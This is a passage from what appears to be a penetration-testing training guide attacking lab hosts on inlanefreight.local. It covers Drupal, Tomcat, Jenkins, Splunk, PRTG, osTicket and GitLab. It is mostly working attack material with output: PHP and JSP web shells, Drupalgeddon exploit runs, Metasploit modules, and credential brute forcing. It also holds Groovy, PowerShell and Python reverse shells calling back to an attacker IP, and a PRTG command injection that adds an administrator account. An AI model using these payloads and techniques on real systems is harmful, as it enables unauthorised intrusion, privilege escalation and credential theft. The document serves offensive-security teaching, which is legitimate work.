system($_GET[''fe8edbabc5c5c9b7b764504cd22b17af'']);
?>
```

Save this as shell.php inside the captcha folder.

### Step 3 — Create .htaccess File

Drupal denies direct access to the /modules folder. Create a .htaccess file to allow access:

```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

What this does: This Apache configuration applies URL rewriting rules for the root / folder, which allows direct HTTP requests to files within the modules directory to be processed correctly.

### Step 4 — Create Backdoored Archive

```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```

What this does: Moves both the shell and .htaccess into the captcha folder, then tar cvf creates a new gzipped archive of the entire backdoored captcha folder.

### Step 5 — Upload and Install the Module

Navigate to Manage → Extend → + Install new module. Browse to the backdoored captcha archive and click Install.

### Step 6 — Execute Commands

```bash
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmed. Remove or disable the PHP Filter module, delete all created pages, and remove the backdoored module after testing. Document everything in the report.

---

## Leveraging Known Vulnerabilities

Over the years, Drupal core has suffered from three major remote code execution vulnerabilities each dubbed Drupalgeddon:

```
CVE-2014-3704 (Drupalgeddon)  — affects versions 7.0 up to 7.31, fixed in 7.32. Pre-authenticated SQL injection flaw used to upload malicious forms or create new admin users.
CVE-2018-7600 (Drupalgeddon2) — affects Drupal prior to 7.58 and 8.5.1. RCE due to insufficient input sanitization during user registration allowing system-level command injection.
CVE-2018-7602 (Drupalgeddon3) — affects multiple versions of Drupal 7.x and 8.x. Authenticated RCE exploiting improper validation in the Form API.
```

### Drupalgeddon

#### Run the Exploit Script

```bash
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

What each flag does:

```
-t http://drupal-qa.inlanefreight.local  — the target Drupal URL
-u hacker  — the username for the new admin account to create
-p pwnd    — the password for the new admin account
```

Output:

```
[!] VULNERABLE!
[!] Administrator user created!
[*] Login: hacker
[*] Pass: pwnd
[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node
```

The exploit uses a pre-authentication SQL injection to insert a new administrator user into the database. Log in as hacker:pwnd and then use any of the code execution methods described above. This can also be exploited using the exploit/multi/http/drupal_drupageddon Metasploit module.

---

### Drupalgeddon2

#### Step 1 — Run the PoC Script

```bash
python3 drupalgeddon2.py
```

Enter the target URL when prompted:

```
Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/
```

The script uploads a hello.txt file to confirm the vulnerability:

```bash
curl -s http://drupal-dev.inlanefreight.local/hello.txt
```

Output:

```
;-)
```

File upload confirmed, vulnerability is present.

#### Step 2 — Create Malicious PHP Shell

```php
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
```

Encode it to base64:

```bash
echo ''<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>'' | base64
```

Output:

```
PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
```

#### Step 3 — Modify and Run the Exploit to Upload PHP Shell

Replace the echo command in the exploit script with:

```bash
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```

What this does: Decodes the base64 string back to the PHP shell code and writes it to a file named mrb3n.php. Run the modified exploit to upload the PHP file to the target. Then confirm RCE:

```bash
curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### Drupalgeddon3

Drupalgeddon3 is an authenticated RCE that requires a user with the ability to delete a node. It is exploited using Metasploit after obtaining a valid session cookie by logging in to the Drupal site.

#### Set Up Metasploit Module

```bash
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) > exploit
```

What each option does:

```
rhosts         — the target server IP address
VHOST          — the virtual hostname of the Drupal site
drupal_session — the authenticated session cookie captured from a logged-in browser session
DRUPAL_NODE    — an existing node number (page/article) that the user has delete permission for
LHOST          — your attacker machine IP for the reverse shell callback
```

Output:

```
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:44612)
meterpreter > getuid
Server username: www-data (33)
meterpreter > sysinfo
Computer    : app01
OS          : Linux app01 5.4.0-81-generic
```

---

# Tomcat - Discovery & Enumeration

Apache Tomcat is an open-source web server that hosts applications written in Java. Tomcat was initially designed to run Java Servlets and Java Server Pages (JSP) scripts, and its popularity grew significantly with Java-based frameworks like Spring and build tools like Gradle. According to BuiltWith data, there are over 220,000 live Tomcat websites and over 904,000 websites have at one point used Tomcat. Tomcat holds position number 13 for web servers by market share, and 1.22% of the top 1 million websites use Tomcat while 3.8% of the top 100k websites do. Organizations using Tomcat include Alibaba, the United States Patent and Trademark Office, The American Red Cross, and the LA Times. Tomcat is less commonly exposed to the internet than other services but is far more common during internal penetration tests and often appears at the top of EyeWitness reports under "High Value Targets" — and it is frequently configured with weak or default credentials.

---

## Discovery/Footprinting

Tomcat servers can be identified by the Server header in the HTTP response. Requesting an invalid page on a Tomcat server reveals the server and version in the 404 error page — for example "Apache Tomcat 9.0.30". If custom error pages are in use, another method is checking the /docs page:

```bash
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat
```

What this does: Fetches the Tomcat documentation index page which is available by default and has not been removed by many administrators. The output reveals the Tomcat version in the page title:

```html
<title>Apache Tomcat 9 (9.0.30) - Documentation Index</title>
```

The general Tomcat folder structure includes bin/ (scripts and binaries), conf/ (configuration files including tomcat-users.xml which stores credentials), lib/ (JAR files), logs/ and temp/ (log files), webapps/ (default webroot hosting all applications), and work/ (runtime cache). The tomcat-users.xml file is critical — it controls access to the /manager and /host-manager admin pages and stores usernames, passwords, and roles:

```xml
<user username="tomcat" password="tomcat" roles="manager-gui" />
<user username="admin" password="admin" roles="manager-gui,admin-gui" />
```

The four built-in Tomcat roles are manager-gui (HTML GUI and status pages), manager-script (HTTP API and status pages), manager-jmx (JMX proxy and status pages), and manager-status (status pages only).

---

## Enumeration

After fingerprinting the Tomcat instance, the primary targets are the /manager and /host-manager pages. Use Gobuster to discover these:

```bash
gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

What each flag does:

```
dir   — runs in directory enumeration mode
-u http://web01.inlanefreight.local:8180/  — the target URL including port 8180
-w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt  — the wordlist of directory names to try
```

Output:

```
/docs     (Status: 302)
/examples (Status: 302)
/manager  (Status: 302)
```

The /manager page is found. Attempt to log in with weak credentials such as tomcat:tomcat, admin:admin, tomcat:admin, etc. If successful, we can upload a WAR file to gain RCE.

The WEB-INF/web.xml deployment descriptor is the most important file in any Tomcat web application — it stores route information and class mappings. The WEB-INF/classes/ folder contains compiled Java classes with business logic and potentially sensitive data. The jsp/ folder stores JSP files comparable to PHP files on Apache.

---

# Attacking Tomcat

With a Tomcat instance identified and potentially exposed externally, the primary goal is to gain access to the /manager or /host-manager endpoints which allow WAR file deployment and thus Remote Code Execution. The first step is brute-forcing the Tomcat manager login page, and the second step is uploading a malicious WAR file containing a JSP web shell. We will use both Metasploit''s tomcat_mgr_login module and a custom Python script to demonstrate brute forcing. We will then create a WAR file using the zip utility, upload it via the manager interface, and interact with the deployed web shell. Additionally, we cover CVE-2020-1938 (Ghostcat), an unauthenticated LFI vulnerability via the AJP protocol affecting all Tomcat versions before 9.0.31, 8.5.51, and 7.0.100.

## Tomcat Manager - Login Brute Force

### Method 1 — Using Metasploit

```bash
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
```

What each option does:

```
VHOST             — the virtual hostname of the Tomcat site
RPORT 8180        — the target port (Tomcat is on 8180 here, not the default 8080)
stop_on_success true  — stops the scan as soon as valid credentials are found
rhosts            — the target IP address
```

The module uses the default wordlists at /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt. To troubleshoot, proxy through Burp Suite:

```bash
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0.1:8080
```

Verify the scanner is working by checking the Authorization header in Burp — it base64-encodes credentials in the format used by Tomcat''s basic auth. Decode a sample to verify:

```bash
echo YWRtaW46dmFncmFudA== | base64 -d
```

Output: admin:vagrant

Successful result:

```
[+] 10.129.201.58:8180 - Login Successful: tomcat:admin
```

### Method 2 — Using Custom Python Script

```bash
python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

What each flag does:

```
-U  — the base URL to the Tomcat server
-P /manager  — the path to the manager login page
-u  — the file containing usernames to try
-p  — the file containing passwords to try
```

Output:

```
[+] Success!!
[+] Username : b''tomcat''
[+] Password : b''admin''
```

Same result as Metasploit — tomcat:admin confirmed.

---

## Tomcat Manager - WAR File Upload

With valid manager credentials, browse to:

```
http://web01.inlanefreight.local:8180/manager/html
```

Log in with tomcat:admin. Download a JSP web shell and package it as a WAR file:

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
```

What this does: wget downloads the JSP web shell. zip -r backup.war cmd.jsp packages the JSP file into a WAR archive named backup.war. The -r flag means recursive. Click Browse, select backup.war, and click Deploy in the manager interface.

Execute commands via the deployed web shell:

```bash
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```

Output:

```
Command: id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

After testing, click Undeploy in the Tomcat Manager to remove the backup.war file and associated directory. Note the upload path /opt/tomcat/apache-tomcat-10.0.10/webapps for the report.

### Alternative — Use msfvenom to Generate Malicious WAR

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```

What each flag does:

```
-p java/jsp_shell_reverse_tcp  — the Java JSP reverse shell payload
LHOST=10.10.14.15              — your attacker machine IP for the reverse shell
LPORT=4443                     — the port your listener will receive the connection on
-f war                         — output format as WAR file
> backup.war                   — saves the output to backup.war
```

Start a listener and deploy the WAR file:

```bash
nc -lnvp 4443
```

Click /backup in the manager to trigger the shell. Output on listener:

```
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 45224
id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

---

## CVE-2020-1938 : Ghostcat

Ghostcat is an unauthenticated LFI vulnerability affecting all Tomcat versions before 9.0.31, 8.5.51, and 7.0.100. It was caused by a misconfiguration in the AJP protocol (Apache Jserv Protocol) used by Tomcat on port 8009. First confirm the AJP port is open:

```bash
nmap -sV -p 8009,8080 app-dev.inlanefreight.local
```

What this does: Runs a version scan (-sV) against ports 8009 and 8080 specifically. Output:

```
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30
```

Both ports confirmed open. Exploit using the PoC script to read WEB-INF/web.xml:

```bash
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
```

What each flag does:

```
app-dev.inlanefreight.local  — the target hostname
-p 8009                      — the AJP port to connect to
-f WEB-INF/web.xml           — the file to read (must be within the webapp folder)
```

The exploit can only read files within the web apps folder — files like /etc/passwd cannot be accessed. However, WEB-INF/web.xml often contains sensitive route and configuration information. Output returns the full XML content of web.xml, confirming the vulnerability.

---

# Jenkins - Discovery & Enumeration

Jenkins is an open-source automation server written in Java that helps developers build and test software projects continuously. It was originally named Hudson, released in 2005, and was renamed Jenkins in 2011 after a dispute with Oracle. It is a server-based system that runs in servlet containers such as Tomcat, and over 86,000 companies use Jenkins including Facebook, Netflix, Udemy, Robinhood, and LinkedIn. Jenkins has over 300 plugins to support building and testing projects in virtually any language. Researchers have uncovered various vulnerabilities in Jenkins over the years, including some that allow for remote code execution without requiring authentication. During an internal penetration test, Jenkins is often installed in the context of the root or SYSTEM account, making it an extremely high-value target — gaining access provides not just RCE but often privileged access to the host and the broader domain environment.

---

## Discovery/Footprinting

Jenkins runs on Tomcat port 8080 by default and also utilizes port 5000 to attach slave servers for communication between masters and slaves. Jenkins can use a local database, LDAP, Unix user database, delegate security to a servlet container, or use no authentication at all. Administrators can also allow or disallow users from creating accounts. Jenkins is quickly fingerprintable by its distinctive login page at http://jenkins.inlanefreight.local:8000/login?from=%2F. We may encounter a Jenkins instance using weak or default credentials such as admin:admin, or one with no authentication enabled at all — both are common findings during internal penetration tests.

---

## Enumeration

The default installation typically uses Jenkins'' database to store credentials and does not allow users to register an account. Browse to the Jenkins security configuration at:

```
http://jenkins.inlanefreight.local:8000/configureSecurity/
```

This shows what authentication mechanism is in use. The login page at http://jenkins.inlanefreight.local:8000/login is a telltale fingerprint of Jenkins. Try weak credentials like admin:admin to gain access. Once logged in, the Script Console at http://jenkins.inlanefreight.local:8000/script is the most direct path to RCE.

---

# Attacking Jenkins

Once we have gained access to a Jenkins application, the quickest way to achieve command execution on the underlying server is via the Script Console. The Script Console allows running arbitrary Groovy scripts within the Jenkins controller runtime, which can be abused to run operating system commands on the underlying server. Jenkins is often installed as root or SYSTEM, making it an easy privilege win. The Script Console is accessible at http://jenkins.inlanefreight.local:8000/script and accepts Apache Groovy scripts — an object-oriented Java-compatible language similar to Python and Ruby. Groovy source code gets compiled into Java Bytecode and can run on any platform that has JRE installed. Additionally, Jenkins has several CVE vulnerabilities, including CVE-2018-1999002 and CVE-2019-1003000, which can be combined to achieve pre-authenticated RCE.

## Script Console

### Step 1 — Execute Commands via Groovy Script

Navigate to http://jenkins.inlanefreight.local:8000/script and enter:

```groovy
def cmd = ''id''
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

What this does line by line:

```
def cmd = ''id''                               — defines the OS command to run
def sout = new StringBuffer(), serr = ...    — creates buffers for standard output and standard error
def proc = cmd.execute()                     — executes the command as a process
proc.consumeProcessOutput(sout, serr)        — captures the output into the buffers
proc.waitForOrKill(1000)                     — waits up to 1000ms for the process to complete
println sout                                 — prints the standard output
```

Result shown in the Jenkins console:

```
uid=0(root) gid=0(root)
```

Jenkins is running as root — maximum privilege.

### Step 2 — Get Reverse Shell via Groovy (Linux)

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

What this does: Uses Java''s Runtime.exec() to launch a bash reverse shell. The exec 5<>/dev/tcp/10.10.14.15/8443 opens a TCP connection to the attacker''s machine. cat <&5 reads from the connection, the while read line loop executes each received line as a command, and output is redirected back through the TCP connection.

Start listener first:

```bash
nc -lvnp 8443
```

Result:

```
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844
id
uid=0(root) gid=0(root) groups=0(root)
```

### Step 3 — Windows Command Execution via Groovy

For Windows Jenkins instances:

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

What this does: Executes the Windows dir command via cmd.exe /c and prints the output. Replace dir with any Windows command.

For a Windows reverse shell use:

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Replace localhost with your attacker IP and 8044 with your listener port.

---

## Miscellaneous Vulnerabilities

Several remote code execution vulnerabilities exist in various Jenkins versions. CVE-2018-1999002 and CVE-2019-1003000 can be combined to achieve pre-authenticated RCE, bypassing script security sandbox protection during script compilation. This flaw works against Jenkins version 2.137. Another vulnerability in Jenkins 2.150.2 allows users with JOB creation and BUILD privileges to execute code via Node.js — if anonymous users are enabled, the exploit succeeds because these users have those privileges by default. The current LTS release of Jenkins at time of writing is 2.303.1 which fixes both flaws.

---

# Splunk - Discovery & Enumeration

Splunk is a log analytics tool used to gather, analyze, and visualize data. Though not originally intended as a SIEM tool, Splunk is often used for security monitoring and business analytics. Splunk was founded in 2003, became profitable in 2009, and had its IPO in 2012 on NASDAQ under the symbol SPLK. It has over 7,500 employees, annual revenue of nearly $2.4 billion, and was named to the Fortune 1000 list in 2020. Splunk''s clients include 92 companies on the Fortune 100 list, and Splunkbase provides over 2,000 available apps and add-ons. Historically, Splunk has not suffered from many known vulnerabilities aside from an information disclosure (CVE-2018-11409) and an authenticated RCE in very old versions (CVE-2011-4642). The biggest security risk with Splunk is weak or null authentication, because admin access gives us the ability to deploy custom applications that can be used to gain RCE and potentially pivot to other hosts in the network.

---

## Discovery/Footprinting

Splunk is prevalent in internal networks and often runs as root on Linux or SYSTEM on Windows systems. The Splunk web server runs by default on port 8000. On older versions of Splunk, the default credentials are admin:changeme, which are conveniently displayed on the login page. If default credentials do not work, try common weak passwords such as admin, Welcome, Welcome1, Password123, etc. Discover Splunk using Nmap:

```bash
sudo nmap -sV 10.129.201.50
```

What this does: Runs a version detection scan against the target. Output identifies:

```
8000/tcp open  ssl/http  Splunkd httpd
8089/tcp open  ssl/http  Splunkd httpd
```

Port 8000 is the Splunk web interface and port 8089 is the Splunk management port for REST API communication.

---

## Enumeration

The Splunk Enterprise trial converts to a free version after 60 days, which does not require authentication at all. This is a common finding — administrators install a trial, forget about it, and it converts to the unauthenticated free version. Once logged in to Splunk (or accessing a Splunk Free instance), we can browse data, run reports, create dashboards, install applications from Splunkbase, and install custom applications. Splunk has multiple ways of running code including server-side Django applications, REST endpoints, scripted inputs, and alerting scripts. A common method of gaining RCE is through scripted inputs — these are designed to integrate Splunk with data sources and run scripts with STDOUT provided as input to Splunk. Scripted inputs can be created to run Bash, PowerShell, or Batch scripts, and every Splunk installation comes with Python installed.

---

# Attacking Splunk

Since our target Splunk runs on a Windows server (identified from the Nmap scan), we will create a custom Splunk application containing a PowerShell reverse shell. The application uses inputs.conf to tell Splunk which script to run and a .bat file to execute the PowerShell payload. Every Splunk installation includes Python, so Python reverse shells work on both Windows and Linux targets. The process involves creating the directory structure, writing the reverse shell, creating the inputs.conf configuration file, packaging everything as a tarball, and uploading it via the Splunk web interface. Once uploaded and enabled, the scripted input fires automatically and we receive a reverse shell connection.

## Abusing Built-In Functionality

### Step 1 — Create Directory Structure

```bash
tree splunk_shell/
```

Output:

```
splunk_shell/
├── bin
└── default
```

The bin directory holds the scripts to run and the default directory holds the inputs.conf configuration file.

### Step 2 — Create PowerShell Reverse Shell (Windows)

Save the following as splunk_shell/bin/run.ps1:

```powershell
$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.15'',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

What this does: Creates a TCP connection to the attacker IP 10.10.14.15 on port 443. Reads commands from the stream, executes them with iex (Invoke-Expression), and sends the output back through the connection.

### Step 3 — Create the .bat Launcher File

Save the following as splunk_shell/bin/run.bat:

```batch
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& ''%~dpn0.ps1''"
Exit
```

What this does: Launches PowerShell with execution policy bypass (-exec bypass), hidden window (-w hidden), and runs the .ps1 file located in the same directory (%~dpn0.ps1).

### Step 4 — Create inputs.conf

Save the following as splunk_shell/default/inputs.conf:

```
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

What this does: Tells Splunk which scripts to run. disabled = 0 enables the input. interval = 10 runs the script every 10 seconds. sourcetype = shell defines the data type. The script will only run if the interval setting is present.

### Step 5 — Package as Tarball

```bash
tar -cvzf updater.tar.gz splunk_shell/
```

What this does: -c creates an archive, -v verbose output shows files being added, -z compresses with gzip, -f updater.tar.gz sets the output filename. This creates the .spl-compatible package.

### Step 6 — Start Listener and Upload

Start listener:

```bash
sudo nc -lnvp 443
```

Navigate to https://10.129.201.50:8000/en-US/manager/search/apps/local, click Install app from file, browse to updater.tar.gz, and click Upload. The app automatically enables and fires the scripted input. Result on listener:

```
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145
PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> hostname
APP03
```

Shell received as NT AUTHORITY\SYSTEM — maximum Windows privilege.

### Linux Target — Use Python Reverse Shell Instead

For Linux targets, modify rev.py in the bin folder:

```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(''/bin/bash'')
```

What this does: Imports necessary modules, creates a socket connection to the attacker''s IP and port, duplicates the socket file descriptor to stdin (0), stdout (1), and stderr (2), then spawns an interactive bash shell over the connection.

---

# PRTG Network Monitor

PRTG Network Monitor is agentless network monitoring software used to monitor bandwidth usage, uptime, and collect statistics from routers, switches, servers, and more. The first version was released in 2003, and in 2015 a free version was released restricted to 100 sensors monitoring up to 20 hosts. PRTG works with an autodiscovery mode to scan network areas and create a device list, gathering further information using protocols such as ICMP, SNMP, WMI, NetFlow, and more. It is used by 300,000 users worldwide, with notable users including Naples International Airport, Virginia Tech, and 7-Eleven. Over the years PRTG has suffered from 26 vulnerabilities assigned CVEs, with only four having easy-to-find public exploits: two XSS, one Denial of Service, and one authenticated command injection (CVE-2018-9276) which we will cover in this section. It is rare to see PRTG exposed externally, but it is commonly found during internal penetration tests.

---

## Discovery/Footprinting/Enumeration

PRTG can typically be found on common web ports such as 80, 443, or 8080. Discover it with Nmap:

```bash
sudo nmap -sV -p- --open -T4 10.129.201.50
```

What each flag does:

```
-sV     — version detection
-p-     — scan all 65535 ports
--open  — only show open ports
-T4     — faster timing template
```

Output identifies:

```
8080/tcp open  http  Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
```

Confirm the version using cURL:

```bash
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version
```

What this does: Fetches the PRTG index page with a specific user agent string that causes PRTG to display version info. Output confirms:

```
PRTG Network Monitor 17.3.33.2830
```

Browse to the login page at http://10.129.201.50:8080/index.htm. Default credentials are prtgadmin:prtgadmin. If these fail, try variations like prtgadmin:Password123. Version 17.3.33.2830 is likely vulnerable to CVE-2018-9276 — an authenticated command injection in the PRTG System Administrator web console for versions before 18.2.39.

---

## Leveraging Known Vulnerabilities

### CVE-2018-9276 — Authenticated Command Injection

#### Step 1 — Navigate to Notifications

Log in as prtgadmin:Password123. Mouse over Setup → Account Settings → Notifications → click Add new notification.

#### Step 2 — Configure Malicious Notification

Give the notification a name (e.g., pwn). Scroll down and tick the EXECUTE PROGRAM checkbox. Under Program File, select Demo exe notification - outfile.ps1. In the Parameter field, enter the command injection payload:

```
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```

What this does: The parameter field is passed directly into a PowerShell script without sanitization. The semicolons (;) act as command separators in PowerShell. net user prtgadm1 Pwn3d_by_PRTG! /add creates a new local user. net localgroup administrators prtgadm1 /add adds that user to the local Administrators group. Click Save.

#### Step 3 — Trigger the Notification

Click the Test button next to the saved notification named pwn. A popup says "EXE notification is queued up." Since this is blind command execution we get no direct feedback.

#### Step 4 — Verify Local Admin Access

```bash
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
```

What this does: Uses CrackMapExec to test SMB authentication with the newly created credentials. Output:

```
SMB  10.129.201.50  445  APP03  [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
```

Local admin access confirmed on the target. The (Pwn3d!) tag confirms administrator-level access.

---

# osTicket

osTicket is an open-source support ticketing system comparable to Jira, OTRS, Request Tracker, and Spiceworks. It integrates user inquiries from email, phone, and web-based forms into a web interface. osTicket is written in PHP and uses a MySQL backend, installable on Windows or Linux. A Google search returns about 44,000 results for companies, school systems, universities, and local government using osTicket. The purpose of this section is both to teach enumeration and attack of osTicket and to introduce the world of support ticketing systems and why they should not be overlooked during assessments. osTicket can be identified by the OSTSESSID cookie name, the osTicket logo with "powered by" text in the page footer, and the words "Support Ticket System" in the footer. A search for CVEs on osTicket shows few vulnerabilities as it is well-maintained, including SSRF (CVE-2020-24881). However, the most valuable attack against osTicket is a social engineering and email-based technique.

---

## Footprinting/Discovery/Enumeration

osTicket is identified by browsing to the support portal URL and looking for the OSTSESSID cookie, the osTicket logo in the footer saying "powered by osTicket", or the phrase "Support Ticket System". An Nmap scan shows only the webserver (Apache or IIS) and does not identify osTicket specifically. The core functions can be broken into three layers: User Input (users submit problems through the portal), Processing (staff reproduce issues in isolated environments), and Solution (technical staff from various departments become involved in email correspondence, revealing new email addresses and potential usernames for OSINT).

---

## Attacking osTicket

### Obtaining a Company Email via Ticket Creation

If we find an exposed osTicket portal during an assessment, we can submit a new ticket and receive a valid company email address assigned to that ticket. Browse to the support portal and open a new ticket:

```
http://support.inlanefreight.local/open.php
```

Fill in contact details and submit. The confirmation page reveals:

```
Support ticket request created
Ticket ID: 940288
Email: 940288@inlanefreight.local
```

This is a real inlanefreight.local email address assigned to our ticket. If the company has services that require email verification (Slack, GitLab, Mattermost, etc.), we can use this email to register and receive the confirmation via the ticket portal at:

```
http://support.inlanefreight.local/open.php
```

View ticket replies and any email sent to 940288@inlanefreight.local appears in the ticket thread.

---

## osTicket - Sensitive Data Exposure

### Step 1 — Use Dehashed to Find Leaked Credentials

```bash
sudo python3 dehashed.py -q inlanefreight.local -p
```

What this does: Queries the Dehashed breach database for entries matching inlanefreight.local, showing -p for plaintext passwords where available. Output reveals leaked credentials including jclayton:JulieC8765! and kgrimes:Fish1ng_s3ason!.

### Step 2 — Enumerate Subdomains

```bash
cat ilfreight_subdomains
```

Output lists subdomains including support.inlanefreight.local and vpn.inlanefreight.local as active targets.

### Step 3 — Log in to osTicket with Found Credentials

Browse to http://support.inlanefreight.local/scp/login.php. Try jclayton — fails. Try kgrimes — fails. Try kevin@inlanefreight.local as the email — success. Log in as the support agent Kevin.

### Step 4 — Find Sensitive Data in Closed Tickets

Browse through closed tickets. Find a conversation where a support agent sent a password directly to a user via the portal. This is the standard new joiner password. Try this password against the exposed VPN portal at vpn.inlanefreight.local. The password may still be valid if the user never changed it. Also export all email addresses from the address book for use in password spraying attacks against the VPN endpoint.

---

# Gitlab - Discovery & Enumeration

GitLab is a web-based Git-repository hosting tool providing wiki capabilities, issue tracking, and CI/CD pipeline functionality. It is open-source, originally written in Ruby, with the current stack including Go, Ruby on Rails, and Vue.js. GitLab was first launched in 2014 and has grown into a 1,400-person company with $150 million revenue in 2020. At time of writing the company has 1,466 employees, over 30 million registered users in 66 countries, and is used by companies including Drupal, Goldman Sachs, Hackerone, Ticketmaster, Nvidia, and Siemens. During penetration tests, Git repositories may contain publicly available code, scripts with hardcoded credentials, SSH private keys, API keys, or configuration files with secrets — all extremely valuable to an attacker. GitLab supports public repositories (no auth required), internal repositories (authenticated users only), and private repositories (specific users only).

---

## Footprinting & Discovery

GitLab is quickly identified by browsing to the GitLab URL which redirects to the login page displaying the GitLab logo at http://gitlab.inlanefreight.local:8081/users/sign_in. The only way to footprint the GitLab version number is by browsing to the /help page when logged in. If the GitLab instance allows registration, log in and browse to /help to confirm the version. Two-factor authentication is disabled by default on GitLab.

---

## Enumeration

### Step 1 — Browse Public Projects

Without being logged in, browse to /explore:

```
http://gitlab.inlanefreight.local:8081/explore
```

This shows any public projects. A project called "Inlanefreight dev" is visible. Public projects may contain source code, hard-coded credentials, SSH private keys, or API keys.

### Step 2 — Register an Account for Internal Access

If the GitLab instance allows self-registration, browse to:

```
http://gitlab.inlanefreight.local:8081/users/sign_up
```

Register with credentials hacker:Welcome. Once logged in, browse to /explore again — an additional internal project "Inlanefreight website" is now visible that was not accessible before.

### Step 3 — Username Enumeration via Registration Form

The registration form can be used to enumerate valid usernames. If we try to register with username root:

```
Error: Username is already taken
```

